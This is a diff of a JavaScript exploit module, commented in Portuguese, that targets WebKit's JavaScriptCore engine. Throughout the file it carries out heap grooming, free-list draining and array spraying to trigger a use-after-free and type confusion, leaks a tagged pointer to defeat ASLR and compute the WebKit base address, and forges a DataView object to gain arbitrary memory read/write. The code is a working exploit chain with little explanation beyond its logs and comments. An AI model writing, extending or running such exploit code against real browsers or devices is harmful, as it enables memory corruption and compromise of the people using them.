@@ -1,9 +1,9 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v11 - Correção de Constante e Reteste Array UAF)
+// js/script3/testArrayBufferVictimCrash.mjs (v11 - Correção de Constante para Scanner de Array Genérico)
 // =======================================================================================
 // ESTA VERSÃO INTEGRA A CADEIA COMPLETA DE EXPLORAÇÃO:
 // 1. Validar primitivas básicas (OOB local).
 // 2. Acionar Use-After-Free (UAF) para obter um ponteiro Double taggeado vazado.
-//    - Vítima e Spray de ARRAYS GENÉRICOS (new Array()).
+//    - NOVO: Vítima e Spray de ARRAYS GENÉRICOS (new Array()).
 //    - Drenagem ativa da free list.
 //    - Múltiplas tentativas de UAF por tamanho.
 //    - CORRIGIDO: ReferenceError para EXPECTED_BUTTERFLY_ELEMENT_SIZE.
@@ -29,7 +29,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE = "v11 - Correção de Constante e Reteste Array UAF";
+export const FNAME_MODULE = "v11 - Correção de Constante para Scanner de Array Genérico";
 
 // Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
 const LOCAL_VERY_SHORT_PAUSE = 10;
@@ -38,8 +38,8 @@ const LOCAL_MEDIUM_PAUSE = 750;
 const LOCAL_LONG_PAUSE = 1500;
 const LOCAL_SHORT_SHORT_PAUSE = 50;
 
-// Tamanho de cada elemento em um Array genérico (JSValue é 8 bytes em sistemas de 64 bits)
-const EXPECTED_BUTTERFLY_ELEMENT_SIZE = 8; // Corrigido: Definido a constante aqui.
+// Constante para o tamanho de cada elemento em um Array genérico (JSValue em 64-bit é 8 bytes)
+const EXPECTED_BUTTERFLY_ELEMENT_SIZE = 8; // Corrigido: Definido globalmente.
 
 let global_spray_objects = [];
 let hold_objects = [];
@@ -142,14 +142,14 @@ export async function arb_write_universal_js_heap(address, value, byteLength, lo
 }
 
 // Funções para converter entre JS Double e AdvancedInt64 (do utils.mjs)
-function _doubleToInt64_core(double) {
+function _doubleToInt64_direct(double) {
     const buf = new ArrayBuffer(8);
     (new Float64Array(buf))[0] = double;
     const u32 = new Uint32Array(buf);
     return new AdvancedInt64(u32[0], u32[1]);
 }
 
-function _int64ToDouble_core(int64) {
+function _int64ToDouble_direct(int64) {
     const buf = new ArrayBuffer(8);
     const u32 = new Uint32Array(buf);
     const f64 = new Float64Array(buf);
@@ -257,7 +257,7 @@ async function triggerGC(logFn, pauseFn) {
 
 /**
  * Tenta acionar o UAF/Type Confusion para um dado comprimento de Array genérico.
- * @param {number} victimArrayLength O comprimento (número de elementos) do Array JavaScript vítima/spray.
+ * @param {number} victimArrayLength O comprimento do Array JavaScript vítima/spray.
  * @param {Function} logFn Função de log.
  * @param {Function} pauseFn Função de pausa.
  * @param {object} JSC_OFFSETS_PARAM Offsets JSC.
@@ -265,31 +265,31 @@ async function triggerGC(logFn, pauseFn) {
  */
 async function attemptUafLeakForArrayLength(victimArrayLength, logFn, pauseFn, JSC_OFFSETS_PARAM) {
     const FNAME = "attemptUafLeakForArrayLength";
-    
-    // O comprimento do array em termos de elementos. Cada elemento é um JSValue (8 bytes).
-    // O JSArray em si tem um cabeçalho (JSObject) e um 'butterfly' que armazena os elementos.
-    // O Type Confusion aqui tentará corromper o 'butterfly' ou o campo de comprimento do Array vítima.
+    // Cada elemento de um Array genérico em JSC é um JSValue, que ocupa 8 bytes (em arquiteturas de 64 bits).
+    const SPRAY_OBJECT_DATA_BYTES = victimArrayLength * EXPECTED_BUTTERFLY_ELEMENT_SIZE; 
 
-    logFn(`[${FNAME}] Tentando UAF para Array de comprimento = ${victimArrayLength} (Total de dados ~ ${victimArrayLength * EXPECTED_BUTTERFLY_ELEMENT_SIZE} bytes)...`, "subtest", FNAME);
+    logFn(`[${FNAME}] Tentando UAF para Array de comprimento = ${victimArrayLength} (Dados = ${SPRAY_OBJECT_DATA_BYTES} bytes)...`, "subtest", FNAME);
 
     let dangling_array_ref = null;
-    const SPRAY_COUNT_UAF_OPT = 3000; 
+    const SPRAY_COUNT_UAF_OPT = 3000;
 
-    // PASSO 1: Heap Grooming (Preparação do Heap) - Antes de alocar a vítima
+    // FASE 1: Heap Grooming (Preparação do Heap)
     const HEAP_GROOMING_SPRAY_COUNT = 20000;
     const grooming_spray_before_victim = [];
     logFn(`[${FNAME}] FASE 1: Heap Grooming com ${HEAP_GROOMING_SPRAY_COUNT} objetos de tamanhos variados...`, "info");
     for (let i = 0; i < HEAP_GROOMING_SPRAY_COUNT; i++) {
         const size_variant = (i % 16) * 0x10 + 0x40;
-        grooming_spray_before_victim.push(new ArrayBuffer(size_variant)); 
+        grooming_spray_before_victim.push(new ArrayBuffer(size_variant));
     }
     hold_objects.push(grooming_spray_before_victim);
     await pauseFn(LOCAL_SHORT_PAUSE);
 
     // PASSO 2: Criar o objeto vítima (Array genérico)
     let victim_js_array = new Array(victimArrayLength);
+    // Preencher com um valor double que não seja um ponteiro válido.
+    // Isso é crucial para distinguir o valor original do valor pulverizado.
     for (let i = 0; i < victimArrayLength; i++) {
-        victim_js_array[i] = i + 0x12345678; 
+        victim_js_array[i] = 1.000000000000123 + i * 0.000000000000001; 
     }
 
     hold_objects.push(victim_js_array);
@@ -297,13 +297,12 @@ async function attemptUafLeakForArrayLength(victimArrayLength, logFn, pauseFn, J
 
     // Forçar otimizações (acessando a vítima repetidamente)
     for (let i = 0; i < 10000; i++) {
-        dangling_array_ref[0] = i; 
+        dangling_array_ref[0] = i;
     }
 
     logFn(`[${FNAME}] Objeto vítima (Array genérico, comprimento ${victimArrayLength}) criado.`, "info");
     logFn(`[${FNAME}] Endereço da referência pendurada (via addrof_core): ${addrof_core(dangling_array_ref).toString(true)}`, "info");
-    // Tentativa de ler o primeiro elemento como um double, para ver se foi corrompido.
-    logFn(`[${FNAME}] Valor inicial da ref. pendurada [0]: ${toHex(_doubleToInt64_core(dangling_array_ref[0]), 64)}`, "info");
+    logFn(`[${FNAME}] Valor inicial da ref. pendurada [0]: ${toHex(_doubleToInt64_direct(dangling_array_ref[0]), 64)}`, "info");
 
     // FASE DE LIBERAÇÃO E GC
     logFn(`[${FNAME}] FASE de liberação e GC...`, "info");
@@ -322,15 +321,15 @@ async function attemptUafLeakForArrayLength(victimArrayLength, logFn, pauseFn, J
     logFn(`[${FNAME}] Grooming spray inicial liberado e GC forçado.`, "info");
     await pauseFn(LOCAL_SHORT_SHORT_PAUSE);
 
-    // Drenagem Ativa da Free List (para arrays genéricos)
+    // Drenagem Ativa da Free List
     const DRAIN_COUNT = 75;
     const DRAIN_SPRAY_PER_ITERATION = 75;
     logFn(`[${FNAME}] FASE 2.5: Drenagem Ativa da Free List...`, "info");
     for (let d = 0; d < DRAIN_COUNT; d++) {
         const drain_objects = [];
         for (let i = 0; i < DRAIN_SPRAY_PER_ITERATION; i++) {
-            // Drenar com Arrays genéricos vazios ou de 1 elemento.
-            drain_objects.push(new Array(1).fill(0xDEADBEEF));
+            // Drenar com Arrays genéricos vazios ou de 1 elemento, para limpar buckets pequenos.
+            drain_objects.push(new Array(1).fill(0xDEADBEEF)); 
         }
         if (d % 5 === 0) { await triggerGC(logFn, pauseFn); }
         await pauseFn(LOCAL_VERY_SHORT_PAUSE);
@@ -344,21 +343,30 @@ async function attemptUafLeakForArrayLength(victimArrayLength, logFn, pauseFn, J
     logFn(`[${FNAME}] FASE 3: Pulverizando Arrays genéricos (comprimento ${victimArrayLength}) sobre a memória liberada...`, "info");
     const spray_arrays = [];
 
-    // O valor a ser pulverizado é o ponteiro para a Structure da DataView, taggeado.
+    // O valor a ser pulverizado é o ponteiro para a Structure da DataView.
+    // Em um Array genérico, os elementos são JSValues (8 bytes).
+    // Se a confusão de tipos ocorre e o Array vítima é reocupado por um Array spray,
+    // o que esperamos que seja sobrescrito são os elementos internos do Array.
+    // O JSObject.BUTTERFLY_OFFSET é 0x10. Se a vítima é um Array, e o spray é um Float64Array
+    // de tamanho adequado, a posição 0 do Float64Array cairá no offset 0 do buffer de dados.
+    // O que precisamos é que `dangling_array_ref[0]` leia o ponteiro para a Structure do DataView.
+    // Para isso, o spray deve ser um Array Genérico, e o primeiro elemento desse array
+    // deve conter o ponteiro taggeado que queremos vazar.
+
     const TEMPORARY_ESTIMATED_WEBKIT_BASE = new AdvancedInt64(0x00000000, 0x01000000);
     const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64 = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
     let TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64 = TEMPORARY_ESTIMATED_WEBKIT_BASE.add(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64);
     const OBJECT_PTR_TAG_HIGH_EXPECTED = 0x402a0000;
     const tagged_high_for_spray = TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.high() | OBJECT_PTR_TAG_HIGH_EXPECTED;
     TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64 = new AdvancedInt64(TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.low(), tagged_high_for_spray);
-    const spray_value_double_to_leak_ptr = _int64ToDouble_core(TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64);
+    const spray_value_double_to_leak_ptr = _int64ToDouble_direct(TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64);
 
     for (let i = 0; i < SPRAY_COUNT_UAF_OPT; i++) {
-        // Pulverizar com Arrays genéricos. O primeiro elemento será o ponteiro.
+        // ESSENCIAL: Usar Array genérico para o spray.
         const spray_obj = new Array(victimArrayLength);
-        spray_obj[0] = spray_value_double_to_leak_ptr; // O primeiro elemento do spray Array
+        spray_obj[0] = spray_value_double_to_leak_ptr; // Coloca o ponteiro no primeiro elemento
         for (let j = 1; j < victimArrayLength; j++) {
-            spray_obj[j] = _int64ToDouble_core(new AdvancedInt64(0xCC + j, 0xDD + j)); // Preencher com padrões
+            spray_obj[j] = _int64ToDouble_direct(new AdvancedInt64(0xAA + j, 0xBB + j));
         }
         spray_arrays.push(spray_obj);
     }
@@ -371,10 +379,9 @@ async function attemptUafLeakForArrayLength(victimArrayLength, logFn, pauseFn, J
     let uaf_leak_successful = false;
     const read_attempts = 15;
     for(let i = 0; i < read_attempts; i++) {
-        // Acesso ao primeiro elemento do Array vítima que foi sobrescrito por um Array de spray.
-        // Se a reocupação ocorrer, `dangling_array_ref[0]` deve conter o `spray_value_double_to_leak_ptr`.
+        // Acesso ao primeiro elemento do Array vítima que foi sobrescrito por um Array spray.
         leaked_jsvalue_from_uaf_double = dangling_array_ref[0]; 
-        const leaked_int64_debug = _doubleToInt64_core(leaked_jsvalue_from_uaf_double);
+        const leaked_int64_debug = _doubleToInt64_direct(leaked_jsvalue_from_uaf_double);
         const OBJECT_PTR_TAG_HIGH_EXPECTED = 0x402a0000;
         const isTaggedPointer = (leaked_int64_debug.high() & 0xFFFF0000) === (OBJECT_PTR_TAG_HIGH_EXPECTED & 0xFFFF0000);
 
@@ -394,6 +401,7 @@ async function attemptUafLeakForArrayLength(victimArrayLength, logFn, pauseFn, J
         logFn(`[${FNAME}] FALHA: Ponteiro vazado do UAF é inválido (double) ou não taggeado para Array de comprimento=${victimArrayLength}.`, "error");
         return { success: false, leaked_double: NaN };
     }
+
 }
 
 
@@ -407,7 +415,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
     let webkit_base_address = null;
     let found_m_mode = null;
 
-    // Faixa de COMPRIMENTO de Arrays (número de elementos), não bytes.
+    // Faixa de COMPRIMENTO de Arrays (número de elementos).
     // Cada elemento é um JSValue (8 bytes), então length * 8 = bytes de dados.
     const VICTIM_ARRAY_LENGTH_RANGE_START = 2;   // Começa com 2 elementos (16 bytes de dados)
     const VICTIM_ARRAY_LENGTH_RANGE_END = 32;    // Vai até 32 elementos (256 bytes de dados)
@@ -473,12 +481,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             for (let attempt = 1; attempt <= UAF_ATTEMPTS_PER_SIZE; attempt++) {
                 logFn(`[SCANNER] Tentativa UAF #${attempt}/${UAF_ATTEMPTS_PER_SIZE} para comprimento ${length}.`, "info", "SCANNER");
                 
-                // Limpa hold_objects e força GC para cada tentativa de UAF por tamanho.
-                hold_objects = [];
-                await triggerGC(logFn, pauseFn);
-                logFn(`    hold_objects limpos antes da Tentativa UAF #${attempt} para comprimento ${length}.`, "info");
-                await pauseFn(LOCAL_SHORT_PAUSE);
-
                 const uaf_result = await attemptUafLeakForArrayLength(length, logFn, pauseFn, JSC_OFFSETS_PARAM);
 
                 if (uaf_result.success) {
@@ -508,7 +510,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
 
         logFn(`SUCESSO GERAL: Vazamento de ASLR via UAF/TC concluído para Array Length = ${best_victim_length_found}.`, "good");
 
-        let untagged_uaf_addr = _doubleToInt64_core(best_leaked_double);
+        let untagged_uaf_addr = _doubleToInt64_direct(best_leaked_double);
         const original_high = untagged_uaf_addr.high();
         const untagged_high = original_high & 0x0000FFFF;
         untagged_uaf_addr = new AdvancedInt64(untagged_uaf_addr.low(), untagged_high);
@@ -539,7 +541,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
 
         logFn("--- FASE 3: Configurando a NOVA primitiva de L/E Arbitrária Universal (via fakeobj DataView) com Tentativa e Erro de m_mode ---", "subtest");
 
-        const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FOR_FAKE = parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
+        const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FOR_FAKE = parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16);
         const DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = webkit_base_address.add(new AdvancedInt64(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FOR_FAKE, 0));
         logFn(`[${FNAME_CURRENT_TEST_BASE}] Endereço calculado do vtable da DataView Structure para FORJAMENTO: ${DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE.toString(true)}`, "info");
 
